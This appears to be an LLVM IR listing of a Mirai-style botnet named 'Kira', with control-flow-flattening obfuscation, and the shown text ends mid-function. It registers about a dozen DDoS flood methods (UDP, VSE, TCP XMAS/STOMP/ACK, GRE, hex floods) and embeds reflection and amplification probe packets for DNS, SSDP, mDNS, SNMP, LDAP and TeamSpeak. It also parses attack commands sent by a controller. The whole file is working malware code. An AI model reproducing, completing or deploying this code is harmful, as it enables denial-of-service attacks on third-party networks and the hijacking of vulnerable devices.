; ModuleID = 'host/ir_fla/Kira.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.attack_xmas_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.grehdr = type { i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [1 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [31 x i8] c"\01\00\00\01\00\00\00\00\00\00\03www\06google\03com\00\00\01\00\01\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"\01\00\00\01\00\00\00\00\00\00\03www\06google\03com\00\00\05\00\01\00", align 1
@.str.4 = private unnamed_addr constant [41 x i8] c"r\FE\1D\13\00\00\00\00\00\00\00\02\00\01\86\A0\00\01\97|\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.5 = private unnamed_addr constant [49 x i8] c"\D9\00\0A\FA\00\00\00\00\00\01\02\90\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\C5\02\04\EC\ECB\EE\92\00", align 1
@.str.6 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.7 = private unnamed_addr constant [61 x i8] c"0:\02\01\030\0F\02\02Ji\02\03\00\FF\E3\04\01\04\02\01\03\04\100\0E\04\00\02\01\00\02\01\00\04\00\04\00\04\000\12\04\00\04\00\A0\0C\02\027\F0\02\01\00\02\01\000\00\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"\00\01\00\02\00\01\00\00", align 1
@.str.9 = private unnamed_addr constant [52 x i8] c"0\84\00\00\00-\02\01\07c\84\00\00\00$\04\00\0A\01\00\0A\01\00\02\01\00\02\01d\01\01\00\87\0BobjectClass0\84\00\00\00\00\00", align 1
@.str.10 = private unnamed_addr constant [54 x i8] c"\02\01\00\06 \00\00\00\00\00\01\00.n\00\00\00\15service:service-agent\00\07 default\00\00\00\00\00", align 1
@.str.11 = private unnamed_addr constant [157 x i8] c"\00\11\223DUfw\00\00\00\00\00\00\00\00\01\10\02\00\00\00\00\00\00\00\00\C0\00\00\00\A4\00\00\00\01\00\00\00\01\00\00\00\98\01\01\00\04\03\00\00$\01\01\00\00\80\01\00\05\80\02\00\02\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\03\00\00$\02\01\00\00\80\01\00\05\80\02\00\01\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\03\00\00$\03\01\00\00\80\01\00\01\80\02\00\02\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\00", align 1
@.str.12 = private unnamed_addr constant [25 x i8] c"\01\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\10\00", align 1
@.str.13 = private unnamed_addr constant [24 x i8] c"\06\00\FF\07\00\00\00\00\00\00\00\00\00\09 \18\C8\81\008\8E\04\B5\00", align 1
@.str.14 = private unnamed_addr constant [31 x i8] c"SNQUERY: 127.0.0.1:AAAAAA:xsvr\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"8d\C1x\01\B8\9B\CB\8F\00\00\00\00\00\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.17 = private unnamed_addr constant [31 x i8] c"\1E\00\010\02\FD\A8\E3\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.18 = private unnamed_addr constant [174 x i8] c"M-SEARCH * HTTP/1.1\0D\0AHOST: 255.255.255.255:1900\0D\0AMAN: \22ssdp:discover\22\0D\0AMX: 1\0D\0AST: urn:dial-multiscreen-org:service:dial:1\0D\0AUSER-AGENT: Google Chrome/60.0.3112.90 Windows\0D\0A\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [47 x i8] c"\00\00\00\00\00\01\00\00\00\00\00\00\09_services\07_dns-sd\04_udp\05local\00\00\0C\00\01\00", align 1
@.str.20 = private unnamed_addr constant [182 x i8] c"xf4\BE\03\00\00\00\00\00\00\00\00\00\01\00\00\02x\BA\85\09TeamSpeak\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0AWindows XP\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\02\00\00\00 \00<\00\00\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\08nickname\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.21 = private unnamed_addr constant [163 x i8] c"\05\CA\7F\16\9C\11\F9\89\00\00\00\00\02\9Dt\8BE\AA{\EF\B9\9E\FE\AD\08\19\BA\CFA\E0\16\A22l\F3\CF\F4\8E<D\83\C8\8DQEo\90\95#>\00\97+\1Cq\B2N\C0a\F1\D7o\C5~\F6HR\BF\82j\A2;e\AA\18z\178\C3\81'\C3G\FC\A75\BA\FC\0F\9D\9Dr$\9D\FC\02\17mk\B1-r\C6\E3\17\1C\95\D9i\99W\CE\DD\DF\05\DC\03\94V\04:\14\E5\AD\9A+\140:#\A3%\AD\E8\E69\8A\85*\C6\DF\E5]-\A0/]\9C\D7+$\FB\B0\9C\C2\BA\89\B4\1B\17\A2\B6\00", align 1
@random_hex.hexs = private unnamed_addr constant [256 x i8] c"\00\01\02\03\04\05\06\07\08\09\0A\0B\0C\0D\0E\0F\10\11\12\13\14\15\16\17\18\19\1A\1B\1C\1D\1E\1F !\22#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\5C]^_`abcdefghijklmnopqrstuvwxyz{|}~\7F\80\81\82\83\84\85\86\87\88\89\8A\8B\8C\8D\8E\8F\90\91\92\93\94\95\96\97\98\99\9A\9B\9C\9D\9E\9F\A0\A1\A2\A3\A4\A5\A6\A7\A8\A9\AA\AB\AC\AD\AE\AF\B0\B1\B2\B3\B4\B5\B6\B7\B8\B9\BA\BB\BC\BD\BE\BF\C0\C1\C2\C3\C4\C5\C6\C7\C8\C9\CA\CB\CC\CD\CE\CF\D0\D1\D2\D3\D4\D5\D6\D7\D8\D9\DA\DB\DC\DD\DE\DF\E0\E1\E2\E3\E4\E5\E6\E7\E8\E9\EA\EB\EC\ED\EE\EF\F0\F1\F2\F3\F4\F5\F6\F7\F8\F9\FA\FB\FC\FD\FE\FF", align 16
@hexPayload = global i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [41 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -1287662771, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_nudp)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_stdhex)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udphex)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #7
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #7
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %switchVar = alloca i32
  store i32 -1053848258, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1053848258, label %2
    i32 1493223691, label %6
    i32 -622653767, label %13
    i32 -228073987, label %19
    i32 58756846, label %23
    i32 -456331896, label %26
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:2:                                      ; preds = %loopEntry
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 1
  %5 = select i1 %4, i32 1493223691, i32 -456331896
  store i32 %5, i32* %switchVar
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp ne i32 %10, 0
  %12 = select i1 %11, i32 -622653767, i32 -228073987
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %1, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds [1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = call i32 @kill(i32 %17, i32 9) #7
  store i32 -228073987, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %1, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 %21
  store i32 0, i32* %22, align 4
  store i32 58756846, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %1, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %1, align 4
  store i32 -1053848258, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %23, %19, %13, %6, %2, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %.reg2mem = alloca i64
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  store i64 %14, i64* %.reg2mem
  %switchVar = alloca i32
  store i32 1981738573, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1981738573, label %first
    i32 744483405, label %17
    i32 1107436021, label %18
    i32 -73448684, label %32
    i32 999138978, label %33
    i32 -783256711, label %44
    i32 1492495677, label %45
    i32 915649500, label %57
    i32 307317243, label %58
    i32 -560709264, label %66
    i32 1279171978, label %67
    i32 -1257124510, label %72
    i32 -591389368, label %78
    i32 -29992280, label %120
    i32 1740810059, label %123
    i32 -2092201558, label %128
    i32 1428297182, label %129
    i32 -1171523259, label %141
    i32 585518308, label %146
    i32 68611003, label %152
    i32 2120954102, label %157
    i32 1788610055, label %158
    i32 1131693090, label %175
    i32 -1057821556, label %176
    i32 -1126217617, label %189
    i32 774526412, label %190
    i32 1691945811, label %219
    i32 -1995951796, label %222
    i32 -1146484641, label %223
    i32 1367961110, label %231
    i32 -1051355405, label %235
    i32 668717369, label %238
    i32 1362871777, label %242
    i32 1210571261, label %246
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i64, i64* %.reg2mem
  %15 = icmp ult i64 %.reload, 4
  %16 = select i1 %15, i32 744483405, i32 1107436021
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 1367961110, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %3, align 8
  %20 = bitcast i8* %19 to i32*
  %21 = load i32, i32* %20, align 4
  %22 = call i32 @ntohl(i32 %21) #8
  store i32 %22, i32* %6, align 4
  %23 = load i8*, i8** %3, align 8
  %24 = getelementptr inbounds i8, i8* %23, i64 4
  store i8* %24, i8** %3, align 8
  %25 = load i32, i32* %4, align 4
  %26 = sext i32 %25 to i64
  %27 = sub i64 %26, 4
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %4, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 -73448684, i32 999138978
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 1367961110, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 %38, 1
  %40 = trunc i64 %39 to i32
  store i32 %40, i32* %4, align 4
  %41 = load i32, i32* %4, align 4
  %42 = icmp eq i32 %41, 0
  %43 = select i1 %42, i32 -783256711, i32 1492495677
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 1367961110, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8*, i8** %3, align 8
  %47 = getelementptr inbounds i8, i8* %46, i32 1
  store i8* %47, i8** %3, align 8
  %48 = load i8, i8* %46, align 1
  store i8 %48, i8* %8, align 1
  %49 = load i32, i32* %4, align 4
  %50 = sext i32 %49 to i64
  %51 = sub i64 %50, 1
  %52 = trunc i64 %51 to i32
  store i32 %52, i32* %4, align 4
  %53 = load i8, i8* %8, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 0
  %56 = select i1 %55, i32 915649500, i32 307317243
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1367961110, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %4, align 4
  %60 = sext i32 %59 to i64
  %61 = load i8, i8* %8, align 1
  %62 = zext i8 %61 to i64
  %63 = mul i64 5, %62
  %64 = icmp ult i64 %60, %63
  %65 = select i1 %64, i32 -560709264, i32 1279171978
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 1367961110, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8, i8* %8, align 1
  %69 = zext i8 %68 to i64
  %70 = call noalias i8* @calloc(i64 %69, i64 24) #7
  %71 = bitcast i8* %70 to %struct.attack_target*
  store %struct.attack_target* %71, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  store i32 -1257124510, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %5, align 4
  %74 = load i8, i8* %8, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp slt i32 %73, %75
  %77 = select i1 %76, i32 -591389368, i32 1740810059
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %3, align 8
  %80 = bitcast i8* %79 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %82, i64 %84
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i32 0, i32 1
  store i32 %81, i32* %86, align 4
  %87 = load i8*, i8** %3, align 8
  %88 = getelementptr inbounds i8, i8* %87, i64 4
  store i8* %88, i8** %3, align 8
  %89 = load i8*, i8** %3, align 8
  %90 = getelementptr inbounds i8, i8* %89, i32 1
  store i8* %90, i8** %3, align 8
  %91 = load i8, i8* %89, align 1
  %92 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %92, i64 %94
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i32 0, i32 2
  store i8 %91, i8* %96, align 4
  %97 = load i32, i32* %4, align 4
  %98 = sext i32 %97 to i64
  %99 = sub i64 %98, 5
  %100 = trunc i64 %99 to i32
  store i32 %100, i32* %4, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 0
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %105, i32 0, i32 0
  store i16 2, i16* %106, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 1
  %112 = load i32, i32* %111, align 4
  %113 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i64 %115
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i32 0, i32 0
  %118 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %117, i32 0, i32 2
  %119 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %118, i32 0, i32 0
  store i32 %112, i32* %119, align 4
  store i32 -29992280, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %5, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %5, align 4
  store i32 -1257124510, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %4, align 4
  %125 = sext i32 %124 to i64
  %126 = icmp ult i64 %125, 1
  %127 = select i1 %126, i32 -2092201558, i32 1428297182
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 1367961110, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8*, i8** %3, align 8
  %131 = getelementptr inbounds i8, i8* %130, i32 1
  store i8* %131, i8** %3, align 8
  %132 = load i8, i8* %130, align 1
  store i8 %132, i8* %9, align 1
  %133 = load i32, i32* %4, align 4
  %134 = sext i32 %133 to i64
  %135 = sub i64 %134, 1
  %136 = trunc i64 %135 to i32
  store i32 %136, i32* %4, align 4
  %137 = load i8, i8* %9, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp sgt i32 %138, 0
  %140 = select i1 %139, i32 -1171523259, i32 -1146484641
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load i8, i8* %9, align 1
  %143 = zext i8 %142 to i64
  %144 = call noalias i8* @calloc(i64 %143, i64 16) #7
  %145 = bitcast i8* %144 to %struct.attack_option*
  store %struct.attack_option* %145, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  store i32 585518308, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* %5, align 4
  %148 = load i8, i8* %9, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp slt i32 %147, %149
  %151 = select i1 %150, i32 68611003, i32 -1995951796
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i32, i32* %4, align 4
  %154 = sext i32 %153 to i64
  %155 = icmp ult i64 %154, 1
  %156 = select i1 %155, i32 2120954102, i32 1788610055
  store i32 %156, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  store i32 1367961110, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %3, align 8
  %160 = getelementptr inbounds i8, i8* %159, i32 1
  store i8* %160, i8** %3, align 8
  %161 = load i8, i8* %159, align 1
  %162 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %165, i32 0, i32 1
  store i8 %161, i8* %166, align 8
  %167 = load i32, i32* %4, align 4
  %168 = sext i32 %167 to i64
  %169 = sub i64 %168, 1
  %170 = trunc i64 %169 to i32
  store i32 %170, i32* %4, align 4
  %171 = load i32, i32* %4, align 4
  %172 = sext i32 %171 to i64
  %173 = icmp ult i64 %172, 1
  %174 = select i1 %173, i32 1131693090, i32 -1057821556
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 1367961110, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i8*, i8** %3, align 8
  %178 = getelementptr inbounds i8, i8* %177, i32 1
  store i8* %178, i8** %3, align 8
  %179 = load i8, i8* %177, align 1
  store i8 %179, i8* %12, align 1
  %180 = load i32, i32* %4, align 4
  %181 = sext i32 %180 to i64
  %182 = sub i64 %181, 1
  %183 = trunc i64 %182 to i32
  store i32 %183, i32* %4, align 4
  %184 = load i32, i32* %4, align 4
  %185 = load i8, i8* %12, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %184, %186
  %188 = select i1 %187, i32 -1126217617, i32 774526412
  store i32 %188, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 1367961110, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8, i8* %12, align 1
  %192 = zext i8 %191 to i32
  %193 = add nsw i32 %192, 1
  %194 = sext i32 %193 to i64
  %195 = call noalias i8* @calloc(i64 %194, i64 1) #7
  %196 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %197 = load i32, i32* %5, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %199, i32 0, i32 0
  store i8* %195, i8** %200, align 8
  %201 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %202 = load i32, i32* %5, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %204, i32 0, i32 0
  %206 = load i8*, i8** %205, align 8
  %207 = load i8*, i8** %3, align 8
  %208 = load i8, i8* %12, align 1
  %209 = zext i8 %208 to i32
  call void @util_memcpy(i8* %206, i8* %207, i32 %209)
  %210 = load i8, i8* %12, align 1
  %211 = zext i8 %210 to i32
  %212 = load i8*, i8** %3, align 8
  %213 = sext i32 %211 to i64
  %214 = getelementptr inbounds i8, i8* %212, i64 %213
  store i8* %214, i8** %3, align 8
  %215 = load i8, i8* %12, align 1
  %216 = zext i8 %215 to i32
  %217 = load i32, i32* %4, align 4
  %218 = sub nsw i32 %217, %216
  store i32 %218, i32* %4, align 4
  store i32 1691945811, i32* %switchVar
  br label %loopEnd

